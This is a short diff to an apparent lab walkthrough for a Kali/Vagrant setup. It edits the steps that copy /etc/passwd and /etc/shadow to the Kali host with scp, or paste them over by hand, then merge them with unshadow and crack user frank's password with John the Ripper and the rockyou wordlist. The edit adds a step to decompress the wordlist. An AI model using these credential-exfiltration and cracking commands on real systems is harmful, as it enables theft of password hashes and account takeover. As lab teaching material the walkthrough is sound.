@@ -282,13 +282,15 @@ scp /etc/passwd /etc/shadow vagrant@192.168.56.20:/tmp/
 
 or just `cat /etc/passwd` and `cat /etc/shadow` and paste each into a matching file on Kali.
 
-**On Kali** — merge the two files with `unshadow`, then crack:
+**On Kali** — rockyou ships gzipped, so decompress it once first, then merge the two files with `unshadow` and crack:
 
 ```bash
+gunzip /usr/share/wordlists/rockyou.txt.gz   # first time only
 unshadow /tmp/passwd /tmp/shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
-john --show unshadowed.txt
 ```
+
+John prints the cracked password as it falls (re-run with `--show` later if you need to see it again).
 
 frank's password is in `rockyou.txt`:
 
